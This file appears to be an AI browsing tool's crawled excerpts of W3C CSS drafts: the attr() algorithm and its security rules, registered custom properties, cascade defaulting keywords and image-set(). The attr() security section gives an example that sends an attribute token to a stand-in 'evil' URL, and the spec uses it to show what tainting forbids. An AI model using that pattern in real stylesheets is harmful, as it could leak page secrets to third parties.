@@ -1,0 +1,251 @@
+CSS Values and Units Module Level 5 (https://drafts.csswg.org/css-values-5/)
+citeturn1359view0 [wordlim: 200] Crawled: today; Content type: text/html; Source: open({"ref_id":"turn1355view0","lineno":1077}); Total lines: 2842
+L1054:   1. Let `el` be the element that the style containing the cite144†attr() function is being applied to. Let `first arg` be the first cite123†<declaration-value> in `arguments`. Let `second arg` be the <declaration-value>? passed after the comma, or null if there was no comma.
+L1055:   2. cite177†Substitute arbitrary substitution functions in `first arg`, then cite166†parse it as cite567†<attr-name> cite568†<attr-type> ?. If that returns failure, jump to the last step (labeled FAILURE). Otherwise, let `attr name` and `syntax` be the results of parsing (with `syntax` being null if cite568†<attr-type> was omitted), processed as specified in the definition of those arguments.
+L1056:   3. If `attr name` exists as an attribute on `el`, let `attr value` be its value; otherwise jump to the last step (labeled FAILURE).
+L1057: 
+L1058:   4. If `syntax` is the keyword number or an cite570†<attr-unit> value, parse `attr value` against cite568†<attr-type> . If that succeeds, return the result; otherwise, jump to the last step (labeled FAILURE).
+L1059: 
+L1060: Note: No parsing or modification of any kind is performed on the value.
+L1061:   5. If `syntax` is null or the keyword raw-string, return a CSS cite156†<string> whose value is `attr value`.
+L1062: 
+L1063: Note: No parsing or modification of any kind is performed on the value.
+L1064: 
+L1065:   6. cite177†Substitute arbitrary substitution functions in `attr value`, with «"attribute", `attr name`» as the cite535†substitution context , then cite172†parse with a <syntax> `attr value`, with `syntax` and `el`. If that succeeds, return the result; otherwise, jump to the last step (labeled FAILURE).
+L1066: 
+L1067:   7. FAILURE:
+L1068:     1. If `second arg` is null, and `syntax` was omitted, return an empty CSS cite156†<string> .
+L1069: 
+L1070:     2. If `second arg` is null, return the cite175†guaranteed-invalid value .
+L1071: 
+L1072:     3. cite177†Substitute arbitrary substitution functions in `second arg`, and return the result.
+L1073: #### 8.7.2. Security
+L1074: 
+L1075: Tests
+L1076:   * cite697†attr-security-animation.html†wpt.fyi cite698†(live test)†wpt.live cite699†(source)†github.com L1077:   * cite700†attr-security-if.html†wpt.fyi cite701†(live test)†wpt.live cite702†(source)†github.com L1078:   * cite703†attr-security-transition.html†wpt.fyi cite704†(live test)†wpt.live cite705†(source)†github.com L1079:   * cite706†attr-security.html†wpt.fyi cite707†(live test)†wpt.live cite708†(source)†github.com L1080:   * cite709†attr-security-transition-interpolated.html†wpt.fyi cite710†(live test)†wpt.live cite711†(source)†github.com L1081: An cite144†attr() function can reference attributes that were never intended by the page to be used for styling, and might contain sensitive information (for example, a security token used by scripts on the page).
+L1082: In general, this is fine. It is difficult to use cite144†attr() to extract information from a page and send it to a hostile party, in most circumstances. The exception to this is URLs. If a URL can be constructed with the value of an arbitrary attribute, purely from CSS, it can easily send any information stored in attributes to a hostile party, if 3rd-party CSS is allowed at all.
+L1083: To guard against this, the values produced by an cite144†attr() are considered attr()-tainted, as are functions that contain an cite712†attr()-tainted value.
+L1084: 
+L1085: The substitution value of an cite132†arbitrary substitution function is cite712†attr()-tainted as a whole if any attr()-tainted values were involved in creating that substitution value. This extends to the cite713†equivalent token sequence†drafts.css-houdini.org when substituting values of cite145†registered custom properties†drafts.css-houdini.org .
+L1086: Using an cite712†attr()-tainted value as or in a cite180†<url> makes a declaration cite492†invalid at computed-value time .
+L1087: 
+L1088: For example, all of the following are cite492†invalid at computed-value time :
+L1089: 
+L1090:   * cite714†background-image: src(attr(foo)); - can’t use it directly.
+L1091: 
+L1092:   * cite714†background-image: image(attr(foo)) - can’t use it in other cite180†<url> -taking functions.
+L1093: 
+L1094:   * cite714†background-image: src(string("http://example.com/evil?token=" attr(foo))) - can’t "launder" it thru another function.
+L1095:   * --foo: attr(foo); background-image(src(var(--foo))) (assuming that --foo is a cite145†registered custom property†drafts.css-houdini.org with string syntax) - can’t launder the value thru another property, either.
+L1096: 
+L1097: However, using cite144†attr() for other purposes is fine, even if the usage is near a url:
+L1098: 
+L1099:   * cite714†background-image: image("foo.jpg", attr(bgcolor type(<color>))) is fine; the cite144†attr() is providing a fallback color, and the cite180†<url> isn’t cite712†attr()-tainted .
+L1100: Using cite144†attr() indirectly via a cite548†custom property causes cite712†attr()-tainting of the whole custom property value:
+L1101: 
+L1102:   * --foo: image("foo.jpg", attr(bgcolor type(<color>))); background-image: var(--foo); is cite492†invalid at computed-value time .
+L1103: 
+L1104: Investigate partial tainting of custom property values.
+L1105: Note: Implementing this restriction requires tracking a dirty bit on values constructed from cite144†attr() values, since they can be fully resolved into a string via cite145†registered custom properties†drafts.css-houdini.org , so you can’t rely on just examining the value expression. Note that non-string types can even trigger this, via functions like string() that can stringify other types of values: --foo: attr(foo type(<number>)); background-image: src(string(var(--foo))) needs to be invalid as well.
+L1106: ### 8.8. Constructing cite571†<custom-ident> values: the cite715†ident() function
+L1107: 
+L1108: Tests
+L1109: 
+L1110:   * cite716†ident-function-computed.html†wpt.fyi cite717†(live test)†wpt.live cite718†(source)†github.com L1111:   * cite719†ident-function-parsing.html†wpt.fyi cite720†(live test)†wpt.live cite721†(source)†github.com L1112:   * cite722†ident-function-substitution.html†wpt.fyi cite723†(live test)†wpt.live cite724†(source)†github.com L1113: The ident() function represents an arbitrary cite155†<ident> , built from one or more separate idents, strings, and integers. It is an cite132†arbitrary substitution function .
+L1114: 
+L1115:     cite715†<ident()> = ident( cite725†<ident-arg> cite726†+ )
+L1116:     cite725†<ident-arg> = cite156†<string> cite139†| cite727†<integer> cite139†| cite155†<ident> L1117: 
+L1118: 
+L1119: The cite715†ident() function’s cite527†argument grammar is:
+L1120: 
+L1121:     cite728†<ident-args> = ident( cite123†<declaration-value> )
+L1122: cite715†ident() can be used anywhere that an cite167†identifier is expected, but it’s most useful to construct cite571†<custom-ident> or cite729†<dashed-ident> values.
+L1123: 
+L1124: In the following example, each matched element gets a unique cite730†view-timeline-name by combining a shared prefix with cite731†sibling-index() to differentiate each element:
+L1125: 
+L1126:     .item {
+L1127:       /* vtl-1, vtl-2, vtl-3, … */
+L1128:       view-timeline-name: ident("vtl-" sibling-index());
+L1129:     }
+--------------------------------------------------------------------------------
+CSS Properties and Values API Level 1 (https://drafts.css-houdini.org/css-properties-values-api-1/)
+citeturn1359view1 [wordlim: 200] Crawled: today; Content type: text/html; Source: open({"ref_id":"turn1355view1","lineno":133}); Total lines: 1339
+L108: ### 2.1. Determining the Registration
+L109: 
+L110: A cite81†registered custom property has a custom property registration that contains all the data necessary to treat it like a real property. It’s a cite82†struct†infra.spec.whatwg.org consisting of:
+L111: 
+L112:   * a property name (a cite83†custom property name string )
+L113: 
+L114:   * optionally, a syntax (a cite84†syntax string ) (defaulting to `"*"`)
+L115: 
+L116:   * optionally, an inherit flag (a cite85†boolean†infra.spec.whatwg.org ) (defaulting to `true`)
+L117:   * optionally, an initial value (a CSS value which successfully cite86†parses†drafts.csswg.org according to the syntax) (defaulting to the cite87†guaranteed-invalid value†drafts.csswg.org )
+L118: 
+L119: If the `cite78†Document†dom.spec.whatwg.org `’s `cite80†[[registeredPropertySet]] ` slot cite88†contains†infra.spec.whatwg.org a record with the cite77†custom property’s†drafts.csswg.org name, the registration is that record.
+L120: Otherwise, if the `cite78†Document†dom.spec.whatwg.org `’s active stylesheets contain at least one valid cite74†@property rule representing a registration with the cite77†custom property’s†drafts.csswg.org name, the last such one in document order is the registration.
+L121: 
+L122: Otherwise there is no registration, and the cite77†custom property†drafts.csswg.org is not a cite81†registered custom property .
+L123: ### 2.2. Parse-Time Behavior
+L124: 
+L125: cite81†Registered custom properties parse exactly like unregistered cite77†custom properties†drafts.csswg.org ; almost anything is allowed. The registered syntax of the property is not checked at parse time.
+L126: 
+L127: Note: However, the syntax is checked at computed-value time, before substitution via cite89†var()†drafts.csswg.org . See cite25†§ 2.4 Computed Value-Time Behavior .
+L128: 
+L129: Why aren’t custom properties syntax-checked?
+L130: When parsing a page’s CSS, UAs commonly make a number of optimizations to help with both speed and memory.
+L131: 
+L132: One of those optimizations is that they only store the properties that will actually have an effect; they throw away invalid properties, and if you write the same property multiple times in a single declaration block, all but the last valid one will be thrown away. (This is an important part of CSS’s error-recovery and forward-compatibility behavior.)
+L133: This works fine if the syntax of a property never changes over the lifetime of a page. If a custom property is registered, however, it can change its syntax, so that a property that was previously invalid suddenly becomes valid.
+L134: The only ways to handle this are to either store every declaration, even those that were initially invalid (increasing the memory cost of pages), or to re-parse the entire page’s CSS with the new syntax rules (increasing the processing cost of registering a custom property). Neither of these are very desirable.
+L135: Further, UA-defined properties have their syntax determined by the version of the UA the user is viewing the page with; this is out of the page author’s control, which is the entire reason for CSS’s error-recovery behavior and the practice of writing multiple declarations for varying levels of support. A custom property, on the other hand, has its syntax controlled by the page author, according to whatever stylesheet or script they’ve included in the page; there’s no unpredictability to be managed.
+L136: Throwing away syntax-violating custom properties would thus only be, at best, a convenience for the page author, not a necessity like for UA-defined properties.
+L137: ### 2.3. cite90†Specified Value†drafts.csswg.org -Time Behavior
+L138: 
+L139: Just like unregistered cite77†custom properties†drafts.csswg.org , all cite81†registered custom properties , regardless of registered syntax, accept the cite91†CSS-wide keywords†drafts.csswg.org , such as cite92†inherit†drafts.csswg.org or cite93†revert†drafts.csswg.org . Their behavior is defined in cite94†CSS Cascading 4 § 7.3 Explicit Defaulting†drafts.csswg.org .
+L140: ### 2.4. cite95†Computed Value†drafts.csswg.org -Time Behavior
+L141: 
+L142: The cite95†computed value†drafts.csswg.org of a cite81†registered custom property is determined by the syntax of its cite96†registration .
+L143: 
+L144: If the cite96†registration’s syntax is the cite97†universal syntax definition , the cite95†computed value†drafts.csswg.org is the same as for unregistered cite77†custom properties†drafts.csswg.org (either the specified value with variables substituted, or the cite87†guaranteed-invalid value†drafts.csswg.org ).
+L145: Otherwise, attempt to cite86†parse†drafts.csswg.org the property’s value according to its registered syntax. If this fails, the declaration is cite98†invalid at computed-value time†drafts.csswg.org and the cite95†computed value†drafts.csswg.org is determined accordingly. If it succeeds, the cite95†computed value†drafts.csswg.org depends on the specifics of the syntax:
+L146: 
+L147: For `"<length>"`, `"<length-percentage>"`, `"<angle>"`, `"<time>"`, `"<resolution>"`, `"<integer>"`, `"<number>"`, and `"<percentage>"` values:
+L148:   * If the specified value is a cite99†dimension†drafts.csswg.org literal (such as 50em or .2s), the computed value is the same value, but with the unit converted to the corresponding cite100†canonical unit†drafts.csswg.org for the type of value.
+L149: 
+L150:   * If the specified value is any other numeric literal (such as 5 or 20%), the computed value is as specified. (In particular, percentages are never resolved against anything.)
+L151:   * If the specified value is a function that evaluates to one of those types (such as a cite101†math function†drafts.csswg.org ), the computed value is defined by that function.
+L152: 
+L153: For `"<string>"` values, the computed value is as specified.
+L154: 
+L155: For `"<color>"` values, the value is computed by resolving color values, per cite102†CSS Color 4 §  15. Resolving <color> Values†drafts.csswg.org .
+L156: 
+L157: For `"<custom-ident>"`, ident, or `"*"` values, the computed value is as specified.
+L158: For `"<url>"` values, the computed value is one of the following:
+L159: 
+L160:   * if the URL is a relative URL, the computed value is the resolved absolute URL as described in cite103†[css3-values] .
+L161: 
+L162:   * otherwise, the computed value is as specified.
+L163: 
+L164: URL behavior examples
+L165: 
+L166: Because URLs resolve against the base URL of the stylesheet they appear in, we can end up with multiple relative URLs that resolve against different base URLs, even though they appear in the same property.
+L167: For example, suppose --url-foo and --url-bar are registered custom properties with <url> syntax, and that we have a stylesheet at `/style/foo/foo.css`:
+L168: 
+L169:     div {
+L170:       --url-foo: url("foo.png");
+L171:     }
+L172: 
+L173: 
+L174: and another stylesheet at `/style/bar/bar.css`
+L175: 
+L176:     div {
+L177:       --url-bar: url("bar.png");
+L178:     }
+L179: and finally a document at `/index.html`:
+--------------------------------------------------------------------------------
+CSS Cascading and Inheritance Module Level 4 (https://drafts.csswg.org/css-cascade-4/)
+citeturn1359view2 [wordlim: 200] Crawled: today; Content type: text/html; Source: open({"ref_id":"turn1357view2","lineno":425}); Total lines: 933
+L415: The UA may choose to honor presentational hints in a source document’s markup, for example the `bgcolor` attribute or `cite256†s†html.spec.whatwg.org ` element in cite252†[HTML] . All document language-based styling must be translated to corresponding CSS rules and enter the cascade as rules in either the cite238†UA-origin or a special-purpose author presentational hint origin between the regular cite239†user origin and the cite240†author origin .
+L416: For the purpose of cite98†cascading this cite257†author presentational hint origin is treated as an independent cite133†origin , but for the purpose of the cite24†revert keyword it is considered part of the author origin.
+L417: A document language may define whether such a presentational hint enters the cite98†cascade as cite238†UA-origin or cite240†author-origin ; if so, the UA must behave accordingly. For example, cite258†[SVG11] maps its presentation attributes into the author origin.
+L418: Note: Presentational hints entering the cite98†cascade as cite238†UA-origin rules can be overridden by cite240†author-origin or cite239†user-origin styles. Presentational hints entering the cascade as cite257†author presentational hint origin rules can be overridden by author-origin styles, but not by non-cite236†important user-origin styles. Host languages should choose the appropriate origin for presentational hints with these considerations in mind.
+L419: ## 7. Defaulting
+L420: 
+L421: When the cite98†cascade does not result in a value, the cite102†specified value must be found some other way. cite259†Inherited properties draw their defaults from their parent element through cite100†inheritance ; all other properties take their cite101†initial value . Authors can explicitly request inheritance or initialization via the cite260†inherit and cite261†initial keywords.
+L422: ### 7.1. Initial Values
+L423: 
+L424: Each property has an initial value, defined in the property’s definition table. If the property is not an cite259†inherited property , and the cite98†cascade does not result in a value, then the cite102†specified value of the property is its cite101†initial value .
+L425: ### 7.2. Inheritance
+L426: 
+L427: Inheritance propagates property values from parent elements to their children. The inherited value of a property on an element is the cite191†computed value of the property on the element’s parent element. For the root element, which has no parent element, the cite262†inherited value is the cite101†initial value of the property.
+L428: For a cite244†[DOM] tree with shadows, inheritance operates on the cite187†flattened element tree . This means that slotted elements inherit from the `cite263†slot†html.spec.whatwg.org ` they’re assigned to, rather than directly from their cite264†light tree†dom.spec.whatwg.org parent. cite220†Pseudo-elements inherit according to the fictional tag sequence described for each pseudo-element. cite223†[CSS-PSEUDO-4] L429: Some properties are inherited properties, as defined in their property definition table. This means that, unless the cite98†cascade results in a value, the value will be determined by cite100†inheritance .
+L430: 
+L431: A property can also be explicitly inherited. See the cite260†inherit keyword.
+L432: 
+L433: Note: Inheritance follows the document tree and is not intercepted by cite265†anonymous boxes†www.w3.org , or otherwise affected by manipulations of the box tree.
+L434: ### 7.3. Explicit Defaulting
+L435: 
+L436: Several CSS-wide property values are defined below; declaring a property to have these values explicitly specifies a particular defaulting behavior. As specified in cite162†CSS Values and Units†www.w3.org cite163†[css-values-3] , all CSS properties can accept these values.
+L437: 
+L438: The keyword cite24†revert is a cascade-dependent keyword; some contexts may restrict its use while allowing the other cite197†CSS-wide keywords .
+L439: #### 7.3.1. Resetting a Property: the cite261†initial keyword
+L440: 
+L441: The initial cite197†CSS-wide keyword represents the value defined as the property’s cite101†initial value .
+L442: 
+L443: If the cite190†cascaded value of a property is the cite261†initial keyword, the property’s cite102†specified value is its cite101†initial value .
+L444: #### 7.3.2. Explicit Inheritance: the cite260†inherit keyword
+L445: 
+L446: The inherit cite197†CSS-wide keyword represents the property’s cite191†computed value on the parent element.
+L447: 
+L448: If the cite190†cascaded value of a property is the cite260†inherit keyword, the property’s cite102†specified and cite191†computed values are the cite262†inherited value .
+L449: #### 7.3.3. Erasing All Declarations: the cite266†unset keyword
+L450: 
+L451: The unset cite197†CSS-wide keyword acts as either cite260†inherit or cite261†initial , depending on whether the property is cite259†inherited or not.
+L452: If the cite190†cascaded value of a property is the cite266†unset keyword, then if it is an inherited property, this is treated as cite260†inherit , and if it is not, this is treated as cite261†initial . This keyword effectively erases all cite189†declared values occurring earlier in the cite98†cascade , correctly inheriting or not as appropriate for the property (or all longhands of a cite148†shorthand ).
+L453: #### 7.3.4. Rolling Back Cascade Origins: the cite24†revert keyword
+L454: 
+L455: The revert cite197†CSS-wide keyword rolls back the cascade to the cite190†cascaded value of the earlier cite133†origin .
+L456: 
+L457: If the cite190†cascaded value of a property is the cite24†revert keyword, the behavior depends on the cite133†cascade origin to which the cite165†declaration belongs:
+L458: cite238†user-agent origin L459:     Equivalent to cite266†unset .
+L460: cite239†user origin L461:     Rolls back the cite190†cascaded value to the user-agent level, so that the cite102†specified value is calculated as if no cite240†author-origin or cite239†user-origin rules were specified for this property on this element.
+L462: cite240†author origin L463:     Rolls back the cite190†cascaded value to the user level, so that the cite102†specified value is calculated as if no cite240†author-origin rules were specified for this property on this element. For the purpose of cite24†revert , this origin includes the Animation cite133†origin .
+L464: Note: Effectively the cite24†revert keyword is substituted with the value from the earlier cite133†cascade origin . Thus, reverting a cite148†shorthand property reverts all its longhands; reverting any cite39†property alias of a property reverts all of them; reverting one of the paired properties in a cite267†logical property group also reverts the other one; etc.
+L465: ## 8. Changes
+L466: 
+L467: ### 8.1. Changes since the 13 Jan 2022 Candidate Recommendation Snapshot
+L468: 
+L469: Non-trivial changes since the cite3†13 Jan 2022 Candidate Recommendation Snapshot†www.w3.org :
+L470: 
+L471:   * Clarify that all “aliases” of a property are reverted by cite24†revert .
+L472: 
+L473:   * Clarify that style sheets are ordered in cite249†final CSS style sheets order.
+--------------------------------------------------------------------------------
+CSS Images Module Level 4 (https://drafts.csswg.org/css-images-4/)
+citeturn1359view3 [wordlim: 200] Crawled: today; Content type: text/html; Source: open({"ref_id":"turn1357view3","lineno":135}); Total lines: 1844
+L120: In some cases an image is invalid, such as a cite96†<url> pointing to a resource that is not a valid image format or that has failed to load. An invalid image is rendered as a solid-color cite104†transparent image with no cite105†natural dimensions . However, cite106†invalid images can trigger error-handling clauses in some contexts. For example, an invalid image in cite102†list-style-image it is treated as cite107†none , allowing the cite108†list-style-type to render in its place. cite20†[CSS2] L121: While an image is loading, is a loading image. cite109†Loading images are not cite106†invalid images , but have similar behavior: they are rendered as a solid-color cite104†transparent image with no cite105†natural dimensions , and may trigger fallback rendering in contexts that offer it, but must not trigger loading of fallback resources.
+L122: Alternately, if a loading image happens to be replacing an already-loaded image (for example due to changes in the document or style sheet) and the UA is tracking this information, it may continue to render the already-loaded image in place of the loading image.
+L123: Partially-loaded images (whose cite105†natural dimensions are known, but whose image data is not fully loaded) may be either treated as cite109†loading images or as loaded images rendered with partial data. For example, a UA may render an interlaced GIF in place as soon as its first pass of pixel data has loaded or even as soon as the image header (which contains sizing data) has parsed and refresh the rendering as more data loads; or it may wait until the entire image has loaded before using it.
+L124: A cite110†computed cite19†<image> value is the cite111†specified value with any cite96†<url> s, cite112†<color> s, and cite113†<length> s computed.
+L125: ### 2.1. Image File Formats
+L126: 
+L127: At minimum, the UA must support the following image file formats when referenced from an cite19†<image> value, for all the properties in which using <image> is valid:
+L128: 
+L129:   * PNG, as specified in cite114†[PNG] L130:   * SVG, as specified in cite115†[SVG11] , using the cite116†secure static mode†www.w3.org (See cite117†[SVG-INTEGRATION] )
+L131:   * If the UA supports animated cite19†<image> s, SVG, as specified in cite115†[SVG11] , using the cite118†secure animated mode†www.w3.org (See cite117†[SVG-INTEGRATION] )
+L132: The UA may support other file formats as well.
+L133: ### 2.2. Image References: the cite119†url() notation
+L134: 
+L135: Note: No change from cite21†[css-images-3] .
+L136: ### 2.3. Fetching External Images
+L137: 
+L138: To fetch an external image for a stylesheet, given a cite96†<url> `url` and a cite120†CSS declaration block `declaration`, cite121†fetch a style resource given `url`, with ruleOrDeclaration being `declaration`, destination "image", CORS mode "no-cors", and processResponse being the following steps given cite122†response†fetch.spec.whatwg.org `res` and null, failure or a byte stream `byteStream`: If `byteStream` is a byte stream, load the image from the byte stream.
+L139: ### 2.4. Resolution/Type Negotiation: the cite98†image-set() notation
+L140: Delivering the most appropriate image resolution for a user’s device can be a difficult task. Ideally, images should be in the same resolution as the device they’re being viewed in, which can vary between users. However, other factors can factor into the decision of which image to send; for example, if the user is on a slow mobile connection, they may prefer to receive lower-res images rather than waiting for a large proper-res image to load.
+L141: The image-set() function allows an author to ignore most of these issues, simply providing multiple resolutions of an image and letting the UA decide which is most appropriate in a given situation.
+L142: This solution assumes that resolution is a proxy for filesize, and therefore doesn’t appropriately handle multi-resolution sets of vector images, or mixing vector images with raster ones (e.g. for icons). For example, use a vector for high-res, pixel-optimized bitmap for low-res, and same vector again for low-bandwidth (because it’s much smaller, even though it’s higher resolution).
+L143: The syntax for cite98†image-set() is:
+L144: 
+L145:     cite98†<image-set()> = image-set( cite123†<image-set-option> cite124†# )
+L146:     <image-set-option> = [ cite19†<image> cite97†| cite125†<string> ]
+L147:                          [ cite126†<resolution> cite127†|| type(cite125†<string> ) ]cite128†? L148: 
+L149: 
+L150: We should add "w" and "h" dimensions as a possibility to match the functionality of HTML’s cite129†picture†html.spec.whatwg.org .
+L151: 
+L152: Each cite125†<string> inside cite98†image-set() represents a cite96†<url> .
+L153: The cite98†image-set() function can not be nested inside of itself, either directly or indirectly (as an argument to another cite19†<image> type).
+L154: 
+L155: Each cite123†<image-set-option> defines a possible image for the cite98†image-set() function to represent, composed of three parts:
+L156: 
+L157:   * An image reference (required). This can be a URL, or a CSS generated image, such as a cite130†linear-gradient() .
+L158:   * A cite126†<resolution> (optional). This is used to help the UA decide which cite123†<image-set-option> to choose. If the image reference is for a raster image, it also specifies the image’s cite131†natural resolution , overriding any other source of data that might supply a natural resolution.
+L159: If not specified, it behaves as 1x for the purpose of selecting which cite123†<image-set-option> to use. It also defaults the image’s cite131†natural resolution to 1x, but if some other source of data supplies a natural resolution, that resolution must be honored instead.
+L160: 
+L161:   * A type( cite125†<string> ) function (optional), specifying the image’s MIME type in the cite125†<string> .
+L162: If the cite125†<string> , when parsed as a cite132†valid MIME type string†mimesniff.spec.whatwg.org , is either not valid, or is valid but doesn’t specify a supported image format, the cite123†<image-set-option> does not define a valid option. (This has no effect on the validity of the cite98†image-set() function.)
+L163: It does not have any effect on the image itself; an cite123†<image-set-option> like `url("picture.png") 1x type("image/jpeg")` is valid, and if chosen will display the linked PNG image, even though it was declared to be a JPEG.
+L164: 
+L165: If not specified, it has no effect on the cite123†<image-set-option> .
+L166: 
+L167: Tests
+L168:   * cite133†image-set-all-options-invalid.html†wpt.fyi cite134†(live test)†wpt.live cite135†(source)†github.com L169:   * cite136†image-set-calc-x-rendering-2.html†wpt.fyi cite137†(live test)†wpt.live cite138†(source)†github.com L170:   * cite139†image-set-calc-x-rendering.html†wpt.fyi cite140†(live test)†wpt.live cite141†(source)†github.com L171:   * cite142†image-set-computed.sub.html†wpt.fyi cite143†(live test)†wpt.live cite144†(source)†github.com L172:   * cite145†image-set-conic-gradient-rendering.html†wpt.fyi cite146†(live test)†wpt.live cite147†(source)†github.com L173:   * cite148†image-set-content-rendering.html†wpt.fyi cite149†(live test)†wpt.live cite150†(source)†github.com L174:   * cite151†image-set-dpcm-rendering.html†wpt.fyi cite152†(live test)†wpt.live cite153†(source)†github.com L175:   * cite154†image-set-dpi-rendering-2.html†wpt.fyi cite155†(live test)†wpt.live cite156†(source)†github.com 
